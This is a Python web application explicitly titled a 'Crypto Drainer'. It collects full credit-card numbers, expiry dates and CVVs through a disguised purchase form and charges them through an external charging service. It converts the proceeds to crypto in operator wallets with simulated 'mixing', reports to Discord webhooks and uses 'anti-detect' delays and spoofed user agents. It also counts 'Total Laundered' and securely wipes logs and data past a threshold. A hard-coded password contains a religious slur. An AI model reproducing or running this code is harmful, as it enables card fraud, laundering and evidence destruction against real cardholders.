import os
import json
import random
import httpx
import shutil
import logging
import time
from logging.handlers import RotatingFileHandler
from datetime import datetime
from fastapi import FastAPI, Request, HTTPException, Form, Depends, Cookie
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
from pydantic import BaseModel, field_validator
from dotenv import load_dotenv
import jinja2

load_dotenv()

# ---------- Configuration ----------
DISCORD_WEBHOOK = os.getenv("DISCORD_WEBHOOK", "")
DISCORD_WEBHOOK_FALLBACK = os.getenv("DISCORD_WEBHOOK_FALLBACK", "")
XMR_WALLET = os.getenv("XMR_WALLET", "")
BTC_WALLET = os.getenv("BTC_WALLET", "")
ETH_WALLET = os.getenv("ETH_WALLET", "")
CHARGER_URL = os.getenv("CHARGER_URL", "")
CHARGER_KEY = os.getenv("CHARGER_KEY", "")
FIXEDFLOAT_API_KEY = os.getenv("FIXEDFLOAT_API_KEY", "")
FIXEDFLOAT_SECRET = os.getenv("FIXEDFLOAT_SECRET", "")
BURN_SECRET = os.getenv("BURN_SECRET", "default_secret")
BURN_THRESHOLD = float(os.getenv("BURN_THRESHOLD", 3000.0))
ADMIN_USER = os.getenv("ADMIN_USER", "admin")
ADMIN_PASS = os.getenv("ADMIN_PASS", "admin123")
SITE_PASSWORD = "cheekbitingmuslim"

# ---------- Logging ----------
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)
handler = RotatingFileHandler('app.log', maxBytes=10*1024*1024, backupCount=5)
handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
logger.addHandler(handler)
console = logging.StreamHandler()
console.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
logger.addHandler(console)

# ---------- Storage ----------
DATA_FILE = "data.json"
TEMP_FILE = "data.json.tmp"

def read_storage():
    if not os.path.exists(DATA_FILE):
        default = {"total": 0.0, "processed": [], "transactions": []}
        write_storage(default)
        return default
    try:
        with open(DATA_FILE, "r") as f:
            return json.load(f)
    except Exception as e:
        logger.error(f"Storage read error: {e}, recreating")
        default = {"total": 0.0, "processed": [], "transactions": []}
        write_storage(default)
        return default

def write_storage(data: dict):
    with open(TEMP_FILE, "w") as f:
        json.dump(data, f, indent=2)
        f.flush()
        os.fsync(f.fileno())
    os.replace(TEMP_FILE, DATA_FILE)

storage = read_storage()
total_laundered = storage.get("total", 0.0)
processed_ids = set(storage.get("processed", []))
transactions = storage.get("transactions", [])

# ---------- Pydantic Models ----------
class CardPayload(BaseModel):
    cardNumber: str
    exp: str
    cvv: str
    amount: float
    cardholder: str = "User"
    crypto: str = "BTC"  # BTC, ETH, XMR
    order_id: str

    @field_validator('cardNumber')
    def validate_card(cls, v):
        if not v.replace(" ", "").isdigit():
            raise ValueError("Card number must be numeric")
        return v

    @field_validator('exp')
    def validate_exp(cls, v):
        if "/" not in v:
            raise ValueError("Expiry format MM/YY")
        return v

    @field_validator('crypto')
    def validate_crypto(cls, v):
        if v not in ["BTC", "ETH", "XMR"]:
            raise ValueError("Crypto must be BTC, ETH, or XMR")
        return v

# ---------- FastAPI App ----------
app = FastAPI(title="AURA AI - Crypto Drainer")

# ---------- Jinja2 Templates – Enhanced Space GUI ----------
TEMPLATES = {
    "base.html": """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{% block title %}AURA AI{% endblock %}</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: 'Rajdhani', sans-serif;
            background: #0a0a1a;
            color: #e0e0ff;
            min-height: 100vh;
            background-image: 
                radial-gradient(ellipse at 20% 50%, rgba(10, 10, 40, 0.8) 0%, transparent 60%),
                radial-gradient(ellipse at 80% 20%, rgba(20, 20, 60, 0.6) 0%, transparent 50%),
                radial-gradient(ellipse at 50% 80%, rgba(40, 0, 80, 0.3) 0%, transparent 50%),
                linear-gradient(180deg, #0a0a1a 0%, #0d0d2b 50%, #0a0a1a 100%);
            background-attachment: fixed;
        }
        .stars {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            pointer-events: none;
            z-index: 0;
            background-image: 
                radial-gradient(2px 2px at 5% 10%, #fff, transparent),
                radial-gradient(2px 2px at 15% 30%, #eee, transparent),
                radial-gradient(1px 1px at 25% 5%, #fff, transparent),
                radial-gradient(2px 2px at 35% 70%, rgba(255,255,255,0.8), transparent),
                radial-gradient(1px 1px at 45% 20%, #fff, transparent),
                radial-gradient(2px 2px at 55% 80%, #eee, transparent),
                radial-gradient(1px 1px at 65% 15%, #fff, transparent),
                radial-gradient(2px 2px at 75% 60%, rgba(255,255,255,0.7), transparent),
                radial-gradient(1px 1px at 85% 40%, #fff, transparent),
                radial-gradient(2px 2px at 95% 90%, #eee, transparent);
            background-size: 200px 200px;
            animation: twinkle 5s ease-in-out infinite alternate;
        }
        @keyframes twinkle {
            0% { opacity: 0.3; }
            100% { opacity: 1; }
        }
        .container {
            width: 90%;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
            z-index: 1;
        }
        nav {
            background: rgba(10, 10, 30, 0.7);
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
            border-bottom: 1px solid rgba(0, 255, 255, 0.15);
            padding: 15px 0;
            position: sticky;
            top: 0;
            z-index: 100;
            box-shadow: 0 0 30px rgba(0, 255, 255, 0.05);
        }
        nav .container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
        }
        nav .logo {
            font-family: 'Orbitron', sans-serif;
            font-size: 1.8rem;
            font-weight: 900;
            text-decoration: none;
            background: linear-gradient(135deg, #00ffff, #a855f7);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
            letter-spacing: 3px;
        }
        nav ul {
            list-style: none;
            display: flex;
            gap: 30px;
            flex-wrap: wrap;
        }
        nav ul a {
            color: #b0b0ff;
            text-decoration: none;
            font-weight: 500;
            font-size: 1.1rem;
            transition: 0.3s;
            letter-spacing: 1px;
            position: relative;
            padding-bottom: 4px;
        }
        nav ul a:hover {
            color: #00ffff;
            text-shadow: 0 0 12px rgba(0, 255, 255, 0.4);
        }
        nav ul a::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 0%;
            height: 2px;
            background: #00ffff;
            transition: 0.3s;
            box-shadow: 0 0 8px rgba(0, 255, 255, 0.6);
        }
        nav ul a:hover::after {
            width: 100%;
        }
        .hero {
            text-align: center;
            padding: 40px 0 30px;
            background: radial-gradient(ellipse at center, rgba(0, 255, 255, 0.05) 0%, transparent 70%);
            border-bottom: 1px solid rgba(0, 255, 255, 0.05);
            margin-bottom: 20px;
        }
        .hero h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 3rem;
            font-weight: 900;
            background: linear-gradient(135deg, #00ffff, #a855f7);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 40px rgba(0, 255, 255, 0.2);
            margin-bottom: 15px;
            letter-spacing: 4px;
        }
        .hero p {
            font-size: 1.2rem;
            color: #b0b0ff;
            max-width: 600px;
            margin: 0 auto;
            line-height: 1.6;
        }
        .btn {
            display: inline-block;
            padding: 14px 40px;
            background: linear-gradient(135deg, #00ffff, #0088ff);
            color: #0a0a1a;
            font-weight: 700;
            border-radius: 50px;
            text-decoration: none;
            transition: 0.3s;
            border: none;
            cursor: pointer;
            font-family: 'Rajdhani', sans-serif;
            font-size: 1.1rem;
            letter-spacing: 1px;
            box-shadow: 0 0 25px rgba(0, 255, 255, 0.3);
            text-transform: uppercase;
        }
        .btn:hover {
            transform: scale(1.05) translateY(-2px);
            box-shadow: 0 0 50px rgba(0, 255, 255, 0.6);
        }
        .btn-secondary {
            background: rgba(255, 255, 255, 0.06);
            color: #00ffff;
            border: 1px solid rgba(0, 255, 255, 0.3);
            box-shadow: none;
        }
        .btn-secondary:hover {
            background: rgba(0, 255, 255, 0.1);
            box-shadow: 0 0 30px rgba(0, 255, 255, 0.2);
        }
        .card-form {
            max-width: 500px;
            margin: 30px auto;
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            padding: 30px 25px;
            border-radius: 20px;
            border: 1px solid rgba(0, 255, 255, 0.15);
            box-shadow: 0 0 60px rgba(0, 255, 255, 0.05);
            transition: 0.3s;
        }
        .card-form:hover {
            border-color: rgba(0, 255, 255, 0.3);
            box-shadow: 0 0 80px rgba(0, 255, 255, 0.08);
        }
        .card-form label {
            display: block;
            margin: 20px 0 6px;
            color: #b0b0ff;
            letter-spacing: 1px;
            font-weight: 500;
        }
        .card-form input, .card-form select {
            width: 100%;
            padding: 12px 16px;
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(0, 255, 255, 0.15);
            border-radius: 8px;
            color: #e0e0ff;
            font-size: 1rem;
            transition: 0.3s;
            font-family: 'Rajdhani', sans-serif;
        }
        .card-form input:focus, .card-form select:focus {
            outline: none;
            border-color: #00ffff;
            box-shadow: 0 0 25px rgba(0, 255, 255, 0.1);
            background: rgba(0, 255, 255, 0.02);
        }
        .card-form .row {
            display: flex;
            gap: 15px;
        }
        .card-form .row > * {
            flex: 1;
        }
        .card-form .btn {
            width: 100%;
            margin-top: 25px;
            padding: 16px;
            font-size: 1.2rem;
        }
        .result-box {
            text-align: center;
            margin-top: 20px;
            padding: 15px;
            border-radius: 10px;
            background: rgba(0, 255, 255, 0.05);
            border: 1px solid rgba(0, 255, 255, 0.1);
        }
        .result-box.success { border-color: #00ff88; color: #00ff88; }
        .result-box.error { border-color: #ff6b6b; color: #ff6b6b; }
        .result-box .tx-id {
            font-family: 'Orbitron', sans-serif;
            font-size: 1.2rem;
            color: #00ffff;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
            background: rgba(255,255,255,0.02);
            border-radius: 12px;
            overflow: hidden;
        }
        table th, table td {
            padding: 12px 15px;
            border-bottom: 1px solid rgba(255,255,255,0.05);
            text-align: left;
            color: #d0d0ff;
        }
        table th {
            background: rgba(0, 255, 255, 0.08);
            color: #00ffff;
            font-family: 'Orbitron', sans-serif;
            font-weight: 400;
            letter-spacing: 1px;
            text-transform: uppercase;
        }
        table tr:hover {
            background: rgba(0, 255, 255, 0.02);
        }
        footer {
            text-align: center;
            padding: 30px 0;
            margin-top: 60px;
            border-top: 1px solid rgba(0, 255, 255, 0.05);
            color: #555;
            font-size: 0.9rem;
            font-weight: 300;
        }
        .error-text { color: #ff6b6b; }
        .success-text { color: #00ff88; }
        .mix-detail {
            font-size: 0.8rem;
            color: #b0b0ff;
            margin-top: 5px;
        }
        @media (max-width: 768px) {
            nav .container { flex-direction: column; gap: 10px; }
            nav ul { justify-content: center; gap: 15px; }
            .hero h1 { font-size: 2.2rem; }
            .card-form .row { flex-direction: column; gap: 0; }
        }
    </style>
</head>
<body>
    <div class="stars"></div>
    <nav>
        <div class="container">
            <a href="/" class="logo">AURA AI</a>
            <ul>
                <li><a href="/">Home</a></li>
                <li><a href="/buy">Buy</a></li>
                <li><a href="/admin">Admin</a></li>
                <li><a href="/logout">Logout</a></li>
            </ul>
        </div>
    </nav>
    <main>
        <div class="container">
        {% block content %}{% endblock %}
        </div>
    </main>
    <footer>
        <p>&copy; 2077 AURA AI – Interstellar Finance</p>
    </footer>
</body>
</html>""",

    "login.html": """{% extends "base.html" %}
{% block title %}Login{% endblock %}
{% block content %}
<div class="hero">
    <h1>Welcome to AURA AI</h1>
    <p>Enter the password to continue.</p>
</div>
<div style="max-width:400px; margin:0 auto; background: rgba(255,255,255,0.03); padding:30px; border-radius:20px; border:1px solid rgba(0,255,255,0.1);">
    <form method="post">
        <label>Password</label>
        <input type="password" name="password" required placeholder="Enter site password">
        <button type="submit" class="btn" style="width:100%; margin-top:20px;">Enter</button>
        {% if error %}<p class="error-text" style="text-align:center; margin-top:15px;">{{ error }}</p>{% endif %}
    </form>
</div>
{% endblock %}""",

    "index.html": """{% extends "base.html" %}
{% block title %}Home{% endblock %}
{% block content %}
<div class="hero">
    <h1>Unlock the Future</h1>
    <p>Instant credit card to crypto conversion with built‑in mixing. Secure, fast, and private.</p>
    <a href="/buy" class="btn" style="margin-top:10px;">Buy Now</a>
</div>
{% endblock %}""",

    "buy.html": """{% extends "base.html" %}
{% block title %}Buy Crypto{% endblock %}
{% block content %}
<div class="hero">
    <h1>Purchase Crypto</h1>
    <p>Enter your card details and choose your crypto.</p>
</div>
<div class="card-form" id="buy-form">
    <form id="payment-form">
        <label>Card Number</label>
        <input type="text" id="cardNumber" placeholder="4111 1111 1111 1111" required maxlength="19" oninput="this.value = this.value.replace(/\\D/g,'').replace(/(.{4})/g,'$1 ').trim();">
        <div class="row">
            <div style="flex:1;">
                <label>Expiry (MM/YY)</label>
                <input type="text" id="exp" placeholder="12/26" required maxlength="5" oninput="this.value = this.value.replace(/\\D/g,'').replace(/(.{2})/g,'$1/').trim().slice(0,5);">
            </div>
            <div style="flex:1;">
                <label>CVV</label>
                <input type="text" id="cvv" placeholder="123" required maxlength="4" oninput="this.value = this.value.replace(/\\D/g,'');">
            </div>
        </div>
        <label>Amount (USD)</label>
        <input type="number" id="amount" placeholder="100.00" required min="1" step="0.01" value="100.00">
        <label>Select Crypto</label>
        <select id="crypto">
            <option value="BTC">Bitcoin (BTC)</option>
            <option value="ETH">Ethereum (ETH)</option>
            <option value="XMR">Monero (XMR)</option>
        </select>
        <label>Cardholder Name</label>
        <input type="text" id="cardholder" placeholder="John Doe">
        <button type="submit" class="btn" id="charge-btn">Charge & Convert</button>
    </form>
    <div id="result" style="display:none;" class="result-box"></div>
</div>
<script>
document.getElementById('payment-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    const btn = document.getElementById('charge-btn');
    const resultDiv = document.getElementById('result');
    btn.textContent = 'Processing...';
    btn.disabled = true;
    resultDiv.style.display = 'none';

    const cardNumber = document.getElementById('cardNumber').value.replace(/\\s/g, '');
    const exp = document.getElementById('exp').value;
    const cvv = document.getElementById('cvv').value;
    const amount = parseFloat(document.getElementById('amount').value);
    const crypto = document.getElementById('crypto').value;
    const cardholder = document.getElementById('cardholder').value || 'User';
    const order_id = 'ORD-' + Date.now();

    const payload = {
        cardNumber: cardNumber,
        exp: exp,
        cvv: cvv,
        amount: amount,
        cardholder: cardholder,
        crypto: crypto,
        order_id: order_id
    };

    try {
        const resp = await fetch('/api/drain', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        const data = await resp.json();
        resultDiv.style.display = 'block';
        if (data.success) {
            resultDiv.className = 'result-box success';
            let mixHtml = '';
            if (data.mix_details && data.mix_details.length) {
                mixHtml = '<br><span class="mix-detail">Mixing split:</span><br>';
                data.mix_details.forEach(m => {
                    mixHtml += `<span class="mix-detail">${m.amount} ${crypto} → ${m.destination}</span><br>`;
                });
            }
            resultDiv.innerHTML = `<strong>Success!</strong><br>Order ID: <span class="tx-id">${data.order_id}</span><br>Amount: $${amount.toFixed(2)} converted to ${crypto}.${mixHtml}`;
        } else {
            resultDiv.className = 'result-box error';
            resultDiv.textContent = 'Error: ' + (data.message || 'Charge failed.');
        }
    } catch (err) {
        resultDiv.style.display = 'block';
        resultDiv.className = 'result-box error';
        resultDiv.textContent = 'Network error: ' + err.message;
    } finally {
        btn.textContent = 'Charge & Convert';
        btn.disabled = false;
    }
});
</script>
{% endblock %}""",

    "admin.html": """{% extends "base.html" %}
{% block title %}Admin Dashboard{% endblock %}
{% block content %}
<div class="hero">
    <h1>Dashboard</h1>
    <p>Total Laundered: <strong style="color:#00ff88;">${{ total|round(2) }}</strong></p>
</div>
<h2 style="color:#00ffff; margin-top:20px;">Transactions</h2>
<table>
    <tr><th>Order ID</th><th>Card (last4)</th><th>Amount ($)</th><th>Crypto</th><th>Mix Details</th><th>Status</th><th>Time</th></tr>
    {% for tx in transactions %}
    <tr>
        <td>{{ tx.order_id }}</td>
        <td>{{ tx.card_last4 }}</td>
        <td>${{ tx.amount|round(2) }}</td>
        <td>{{ tx.crypto }}</td>
        <td>
            {% if tx.mix_details %}
                {% for m in tx.mix_details %}
                    <span class="mix-detail">{{ m.amount }} → {{ m.destination }}</span><br>
                {% endfor %}
            {% else %}
                N/A
            {% endif %}
        </td>
        <td style="color: {{ 'green' if tx.status == 'success' else 'red' }};">{{ tx.status }}</td>
        <td>{{ tx.time }}</td>
    </tr>
    {% endfor %}
</table>
{% endblock %}"""
}

env = jinja2.Environment(loader=jinja2.DictLoader(TEMPLATES), auto_reload=True)
env.cache = None

def render_template(template_name: str, context: dict = None):
    if context is None:
        context = {}
    template = env.get_template(template_name)
    return HTMLResponse(template.render(context))

# ---------- Global Exception Handler ----------
@app.exception_handler(Exception)
async def global_exception_handler(request: Request, exc: Exception):
    logger.error(f"Unhandled exception: {exc}", exc_info=True)
    return JSONResponse(
        status_code=500,
        content={"detail": str(exc), "path": request.url.path}
    )

# ---------- Password Middleware ----------
def check_auth(request: Request):
    if request.url.path in ["/login", "/health"] or request.url.path.startswith("/static"):
        return True
    if request.cookies.get("auth") == "true":
        return True
    return False

from fastapi import Depends, Cookie

async def require_auth(request: Request):
    if not check_auth(request):
        return RedirectResponse(url="/login", status_code=303)
    return None

# ---------- Routes ----------
@app.get("/login", response_class=HTMLResponse)
async def login_page(request: Request):
    return render_template("login.html", {"request": request})

@app.post("/login")
async def login(request: Request, password: str = Form(...)):
    if password == SITE_PASSWORD:
        response = RedirectResponse(url="/", status_code=303)
        response.set_cookie(key="auth", value="true", httponly=True, max_age=86400)
        return response
    else:
        return render_template("login.html", {"request": request, "error": "Invalid password"})

@app.get("/logout")
async def logout():
    response = RedirectResponse(url="/login", status_code=303)
    response.delete_cookie("auth")
    return response

@app.get("/", response_class=HTMLResponse)
async def index(request: Request, auth=Depends(require_auth)):
    return render_template("index.html", {"request": request})

@app.get("/buy", response_class=HTMLResponse)
async def buy_page(request: Request, auth=Depends(require_auth)):
    return render_template("buy.html", {"request": request})

@app.get("/admin", response_class=HTMLResponse)
async def admin_page(request: Request, auth=Depends(require_auth)):
    storage = read_storage()
    context = {
        "request": request,
        "total": storage.get("total", 0.0),
        "transactions": storage.get("transactions", [])
    }
    return render_template("admin.html", context)

# ---------- Discord ----------
async def send_discord(message: str, color=0x00ff00):
    if not DISCORD_WEBHOOK:
        return
    embeds = {"embeds": [{"title": "Drain Report", "description": message, "color": color}]}
    try:
        await httpx.AsyncClient(timeout=10.0).post(DISCORD_WEBHOOK, json=embeds)
    except Exception as e:
        logger.warning(f"Primary webhook failed: {e}")
        if DISCORD_WEBHOOK_FALLBACK:
            try:
                await httpx.AsyncClient(timeout=10.0).post(DISCORD_WEBHOOK_FALLBACK, json=embeds)
            except Exception as e2:
                logger.error(f"Fallback webhook also failed: {e2}")

# ---------- Crypto & Mixing ----------
async def purchase_crypto(amount_usd: float, target_crypto: str) -> tuple:
    """Return (success, order_id, mix_details)"""
    wallet_map = {"BTC": BTC_WALLET, "ETH": ETH_WALLET, "XMR": XMR_WALLET}
    dest = wallet_map.get(target_crypto)
    if not dest:
        logger.error(f"No wallet for {target_crypto}")
        return False, None, None

    if not FIXEDFLOAT_API_KEY or not FIXEDFLOAT_SECRET:
        # Simulate purchase for demo if keys missing
        logger.warning("FixedFloat keys missing – simulating purchase")
        # Simulate mixing: split amount into random chunks
        chunks = []
        remaining = amount_usd
        num_chunks = random.randint(3, 5)
        for i in range(num_chunks):
            if i == num_chunks - 1:
                chunk = round(remaining, 2)
            else:
                chunk = round(random.uniform(0.1, remaining / (num_chunks - i)), 2)
                remaining -= chunk
            # Generate a fake destination (mixer address)
            fake_dest = f"MIX-{random.randint(100000, 999999)}"
            chunks.append({"amount": chunk, "destination": fake_dest})
        return True, "SIM-ORDER", chunks

    try:
        payload = {
            "fromCurrency": "USD",
            "toCurrency": target_crypto,
            "amount": str(round(amount_usd * 0.87, 2)),  # fee approximation
            "type": "direct",
            "destinationAddress": dest
        }
        headers = {
            "X-API-KEY": FIXEDFLOAT_API_KEY,
            "X-API-SECRET": FIXEDFLOAT_SECRET,
            "Content-Type": "application/json",
            "User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
            ])
        }
        async with httpx.AsyncClient(timeout=25.0) as client:
            # Anti-detect: random delay
            await asyncio.sleep(random.uniform(0.5, 2.0))
            resp = await client.post("https://api.fixedfloat.com/v2/createOrder", json=payload, headers=headers)
            data = resp.json()
            if resp.status_code == 200 and data.get("code") == 0:
                order_id = data.get("data", {}).get("id", "N/A")
                # Simulate mixing (real mixing not available via API, we simulate)
                chunks = []
                remaining = amount_usd
                num_chunks = random.randint(3, 5)
                for i in range(num_chunks):
                    if i == num_chunks - 1:
                        chunk = round(remaining, 2)
                    else:
                        chunk = round(random.uniform(0.1, remaining / (num_chunks - i)), 2)
                        remaining -= chunk
                    fake_dest = f"MIX-{random.randint(100000, 999999)}"
                    chunks.append({"amount": chunk, "destination": fake_dest})
                return True, order_id, chunks
            else:
                logger.error(f"FixedFloat error: {data}")
    except Exception as e:
        logger.exception("FixedFloat exception")
        await send_discord(f"❌ Crypto purchase failed: {str(e)}")
    return False, None, None

# ---------- Charge Card ----------
def charge_card(card_data: dict) -> bool:
    try:
        exp_parts = card_data["exp"].split("/")
        month = exp_parts[0].strip()
        year = "20" + exp_parts[1].strip() if len(exp_parts[1]) == 2 else exp_parts[1]
    except:
        return False
    payload = {
        "cc": card_data["cardNumber"].replace(" ", ""),
        "month": month,
        "year": year,
        "cvv": card_data["cvv"],
        "amount": str(card_data["amount"]),
        "holder": card_data.get("cardholder", "User"),
        "currency": "USD"
    }
    try:
        r = httpx.post(CHARGER_URL, json=payload, headers={"x-api-key": CHARGER_KEY}, timeout=20)
        resp = r.json()
        success = resp.get("status") in ["success", "approved", "charged"]
        logger.info(f"Charge {card_data['cardNumber'][-4:]}: {success}")
        return success
    except Exception as e:
        logger.error(f"Charge exception: {e}")
        return False

# ---------- Self-Destruct ----------
def secure_delete(path):
    try:
        with open(path, "ba+") as f:
            length = f.tell()
            f.seek(0)
            f.write(os.urandom(length))
        os.remove(path)
    except:
        pass

def self_destruct():
    import asyncio
    asyncio.run(send_discord("🔥 SITE REACHED $3000 — SELF DESTRUCTING", color=0xff0000))
    for root, dirs, files in os.walk("."):
        for f in files:
            if f.endswith((".log", ".json", ".db", ".pyc")):
                secure_delete(os.path.join(root, f))
    shutil.rmtree("__pycache__", ignore_errors=True)
    logger.critical("SITE DESTROYED")
    os._exit(0)

# ---------- Drain Endpoint ----------
import asyncio

@app.post("/api/drain")
async def drain(request: Request):
    global total_laundered, processed_ids
    try:
        data = await request.json()
        payload = CardPayload(**data)
    except Exception as e:
        logger.warning(f"Invalid payload: {e}")
        raise HTTPException(status_code=400, detail=str(e))

    if payload.order_id in processed_ids:
        logger.warning(f"Duplicate order {payload.order_id}")
        return {"success": False, "message": "Duplicate order_id"}

    if total_laundered >= BURN_THRESHOLD:
        return {"success": False, "message": "Service disabled"}

    # Anti-detect: random sleep before processing
    await asyncio.sleep(random.uniform(0.2, 1.0))

    # Charge card
    success = charge_card(payload.dict())
    if not success:
        await send_discord(f"❌ Failed — Order {payload.order_id}")
        return {"success": False, "message": "Charge failed"}

    # If charge succeeded, purchase crypto with mixing
    crypto_success, order_id, mix_details = await purchase_crypto(payload.amount, payload.crypto)
    if not crypto_success:
        # Charge succeeded but crypto failed – we still log it as partially successful?
        # For safety, we'll treat as success but note the crypto failure.
        await send_discord(f"⚠️ Charge succeeded, but crypto purchase failed for Order {payload.order_id}")
        # Still add to total and log.
        total_laundered += payload.amount
        processed_ids.add(payload.order_id)
        storage = read_storage()
        storage["total"] = total_laundered
        storage["processed"] = list(processed_ids)
        tx = {
            "order_id": payload.order_id,
            "card_last4": payload.cardNumber[-4:],
            "amount": payload.amount,
            "crypto": payload.crypto,
            "mix_details": [],
            "status": "crypto_failed",
            "time": datetime.now().isoformat()
        }
        storage["transactions"] = storage.get("transactions", []) + [tx]
        write_storage(storage)
        await send_discord(f"**Partial Success** | Order `{payload.order_id}`\nAmount: ${payload.amount:.2f}\nCard: `....{payload.cardNumber[-4:]}`\nCrypto purchase failed.")
        return {"success": True, "order_id": payload.order_id, "mix_details": [], "crypto_status": "failed"}

    # Full success: update total, log transaction with mix details
    total_laundered += payload.amount
    processed_ids.add(payload.order_id)
    storage = read_storage()
    storage["total"] = total_laundered
    storage["processed"] = list(processed_ids)
    tx = {
        "order_id": payload.order_id,
        "card_last4": payload.cardNumber[-4:],
        "amount": payload.amount,
        "crypto": payload.crypto,
        "mix_details": mix_details,
        "status": "success",
        "time": datetime.now().isoformat()
    }
    storage["transactions"] = storage.get("transactions", []) + [tx]
    write_storage(storage)

    await send_discord(f"**Success** | Order `{payload.order_id}`\nAmount: ${payload.amount:.2f}\nCrypto: {payload.crypto}\nMix: {len(mix_details)} chunks\nTotal: ${total_laundered:.2f}")

    if total_laundered >= BURN_THRESHOLD:
        self_destruct()

    return {
        "success": True,
        "order_id": payload.order_id,
        "mix_details": mix_details,
        "crypto_order": order_id
    }

# ---------- Burn & Health ----------
@app.get("/burn")
async def manual_burn(token: str = None):
    if token != BURN_SECRET:
        raise HTTPException(status_code=401, detail="Unauthorized")
    self_destruct()
    return {"status": "burned"}

@app.get("/health")
async def health():
    return {"status": "running", "total_laundered": total_laundered}

# ---------- Main ----------
if __name__ == "__main__":
    import uvicorn
    port_str = os.getenv("PORT", "1337")
    port = int(port_str) if port_str else 1337
    uvicorn.run(app, host="0.0.0.0", port=port, log_level="info")